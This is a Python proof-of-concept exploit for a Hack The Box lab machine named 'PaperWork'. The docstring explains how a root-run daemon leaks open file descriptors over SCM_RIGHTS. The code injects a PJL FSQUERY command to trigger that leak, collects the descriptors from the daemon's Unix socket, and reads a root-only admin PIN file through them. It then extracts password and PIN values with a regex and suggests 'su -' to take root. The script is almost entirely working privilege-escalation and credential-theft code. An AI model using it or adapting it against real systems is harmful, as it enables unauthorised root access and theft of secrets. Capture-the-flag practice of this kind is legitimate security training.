#!/usr/bin/env python3
"""
PaperWork (HTB) - stage 3: SCM_RIGHTS file-descriptor leak from paperwork-daemon.

Run from the `archivist` shell (the socket is root:archivist 0660):

    python3 poc_fdleak_r3by5.py                 # trigger via PJL, then collect fds
    python3 poc_fdleak_r3by5.py --no-trigger    # log already dirty
    python3 poc_fdleak_r3by5.py --out admin.conf

Root cause (/usr/bin/paperwork-daemon):

    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)   # as root, once
    ...
    def scan_for_malice():
        content = open(LOG_PATH).read().upper()          # /home/archivist/printer/logs/commands.log
        return any(t in content for t in ("FSQUERY", "FSUPLOAD", "FSDOWNLOAD"))

    def trigger_lockdown(conn):
        log_fd = os.open(LOG_PATH, os.O_RDONLY)
        conn.sendmsg([b"ALERT: ... FORENSIC_CONTEXT_ATTACHED."],
                     [(socket.SOL_SOCKET, socket.SCM_RIGHTS,
                       array.array("i", [log_fd, admin_fd]))])

Passing a descriptor transfers the *open file description*, so the receiving
process reads the file with the privileges of whoever opened it - here root.
The file's own 0600 root:root permissions never apply to us.

The daemon does not need a magic word on the socket: dirty the PJL command log
(any FS* verb, including the FSDOWNLOAD already used to plant the SSH key),
then connect and receive the ancillary data.
"""

import argparse
import array
import os
import re
import socket
import sys
import time

DEFAULT_SOCKET = "/run/paperwork/mgmt.sock"
UEL = b"\x1b%-12345X"


def dirty_log(host="127.0.0.1", port=9100, timeout=3.0):
    """Ask the JetDirect service to log an FS* verb so the daemon flags lockdown."""
    body = b'@PJL FSQUERY NAME="0:/"\r\n'
    try:
        with socket.create_connection((host, port), timeout) as sock:
            sock.settimeout(timeout)
            sock.sendall(UEL + b"@PJL\r\n" + body + UEL + b"\r\n")
            try:
                sock.recv(4096)
            except socket.timeout:
                pass
        return True
    except OSError as exc:
        print("[!] could not reach PJL service at %s:%d (%s)" % (host, port, exc))
        return False


def collect(sock_path, total_timeout=6.0, max_msgs=4):
    """Connect and gather every descriptor handed to us in ancillary data."""
    fds = array.array("i")
    messages = []
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.settimeout(total_timeout)
    sock.connect(sock_path)
    deadline = time.time() + total_timeout
    try:
        for _ in range(max_msgs):
            left = deadline - time.time()
            if left <= 0:
                break
            sock.settimeout(max(0.2, left))
            try:
                msg, ancdata, _flags, _addr = sock.recvmsg(
                    8192, socket.CMSG_SPACE(8 * fds.itemsize)
                )
            except socket.timeout:
                break
            if msg:
                messages.append(msg)
            for level, ctype, data in ancdata:
                if level == socket.SOL_SOCKET and ctype == socket.SCM_RIGHTS:
                    usable = len(data) - (len(data) % fds.itemsize)
                    fds.frombytes(data[:usable])
            if len(fds) >= 2:
                break
    finally:
        sock.close()
    return messages, fds


def read_fd(fd, size=65536):
    try:
        os.lseek(fd, 0, os.SEEK_SET)
    except OSError:
        pass                     # pipes/sockets cannot seek; just read
    chunks = []
    try:
        while True:
            chunk = os.read(fd, 8192)
            if not chunk:
                break
            chunks.append(chunk)
            if sum(len(c) for c in chunks) >= size:
                break
    except OSError as exc:
        return None, exc
    return b"".join(chunks), None


def main(argv=None):
    p = argparse.ArgumentParser(description="PaperWork SCM_RIGHTS fd-leak client")
    p.add_argument("--socket", default=DEFAULT_SOCKET)
    p.add_argument("--pjl-host", default="127.0.0.1")
    p.add_argument("--pjl-port", type=int, default=9100)
    p.add_argument("--no-trigger", action="store_true", help="skip the PJL FSQUERY nudge")
    p.add_argument("--retries", type=int, default=3)
    p.add_argument("--timeout", type=float, default=6.0)
    p.add_argument("--out", help="write leaked descriptor contents here")
    args = p.parse_args(argv)

    if not args.no_trigger:
        print("[*] dirtying the PJL command log (FSQUERY)")
        dirty_log(args.pjl_host, args.pjl_port)
        time.sleep(0.5)

    fds = array.array("i")
    messages = []
    for attempt in range(1, args.retries + 1):
        try:
            messages, fds = collect(args.socket, args.timeout)
        except OSError as exc:
            print("[-] connect %s failed: %s" % (args.socket, exc))
            return 1
        if len(fds):
            break
        print("[*] attempt %d: no descriptors yet" % attempt)
        time.sleep(1.0)

    for msg in messages:
        text = msg.decode("latin-1", "replace").strip()
        if text:
            print("[*] daemon said: %s" % text)

    if not len(fds):
        print("[!] no descriptors received. Is commands.log non-empty and readable,")
        print("    and is this shell in group archivist (socket mode 0660)?")
        return 1

    print("[+] received %d descriptor(s): %s" % (len(fds), list(fds)))
    findings = {}
    for index, fd in enumerate(fds):
        data, err = read_fd(fd)
        print("\n--- fd %d (%s) ---" % (index, fd))
        if err is not None:
            print("<read failed: %s>" % err)
            continue
        text = data.decode("latin-1", "replace")
        print(text.rstrip("\n") or "<empty>")
        findings[index] = text
        if args.out:
            with open(args.out, "a", encoding="latin-1") as fh:
                fh.write("### fd %d\n%s\n" % (index, text))

    secrets = {}
    for text in findings.values():
        for match in re.finditer(r"(?im)^\s*([A-Z_]*(?:PASSWORD|PASS|PIN)[A-Z_]*)\s*=\s*(\S+)", text):
            secrets[match.group(1)] = match.group(2)
    if secrets:
        print("\n[+] credential material:")
        for key, value in secrets.items():
            print("    %s=%s" % (key, value))
        print("[*] try: su -   (root accepts the admin password on this box)")
    if args.out:
        print("[+] appended leaked contents to %s" % args.out)
    return 0


if __name__ == "__main__":
    sys.exit(main())
